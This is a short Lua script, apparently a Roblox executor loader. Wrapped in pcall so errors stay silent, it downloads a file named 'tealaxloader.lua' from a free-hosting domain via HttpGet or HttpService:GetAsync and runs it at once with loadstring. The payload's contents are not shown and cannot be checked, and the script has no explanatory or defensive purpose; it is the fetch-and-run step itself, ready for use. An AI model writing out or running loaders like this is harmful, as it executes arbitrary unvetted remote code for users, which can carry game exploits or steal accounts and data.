
pcall(function()
    local url = "https://raw-tealaxscripts.wuaze.com/tealaxloader.lua"

    local http_get
    if game.HttpGet then
        http_get = function(u) return game:HttpGet(u, true) end
    else
        local HttpService = game:GetService("HttpService")
        http_get = function(u) return HttpService:GetAsync(u, true) end
    end

    loadstring(http_get(url))()
end)
